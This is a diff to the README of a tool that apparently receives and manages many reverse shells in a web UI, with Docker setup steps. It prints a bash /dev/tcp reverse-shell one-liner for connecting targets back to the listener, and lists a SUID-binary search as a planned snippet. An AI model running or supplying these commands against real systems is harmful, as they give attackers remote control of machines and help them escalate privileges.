@@ -6,26 +6,24 @@ Elegantly receive reverse shell.
 
 Receive multiple reverse shells on one port, and manage them in a web UI.
 
-vi, tmux commands even works ( you may need to gain pty, and set correct stty size. )
+With the usage of [xterm.js](https://xtermjs.org/), complex commands like vi, tmux and Ctrl-C works ( you may need to gain pty, and set correct stty size. )
 
 ![screenshot](images/screenshot.png)
 
 ## Running
 
-Recommended to use Docker.
+Recommended to use the [docker image from dockerhub](https://hub.docker.com/repository/docker/cwithw/shellbin).
 
-```
-make backend-environment
-make frontend-environment
-make docker
+```bash
+docker run -d --name shellbin -p 9998:3000 -p 9999:3001 -e USERNAME=root -e PASSWORD=toor cwithw/shellbin:latest
 ```
 
-copy the `docker` folder to you VPS and run `docker compose up -d --build`.
+Change the value of `USERNAME` and `PASSWORD` to your own username and password. 
+You may also change `9998`(web UI port) and `9999`(reverse shell port) to your own port.
 
-you may want to change `docker/config/config.yml` it contains the username and password (default is admin:admin).
+then visit `http://your-ip:9998` to see the web UI.
 
-you may also want to change the ports in `docker/docker-compose.yml` (default is 9998:3000 and 9999:3001).
-
+receive reverse shells on port 9999 (`bash -i >& /dev/tcp/your-ip/9999 0>&1`).
 
 ## development
 
@@ -38,6 +36,9 @@ make frontend-environment
 
 ```
 make docker
+```
+```
+make build-docker-image
 ```
 
 ## security & performance
@@ -55,3 +56,4 @@ pull requests are welcome.
 - [ ] fancy web UI
 - [ ] resize terminal and send terminal event (currently you need to do `stty` command)
 - [ ] snippets ( eg. `find / -perm 4000 2>/dev/null` )
+- [ ] API for reverse shell
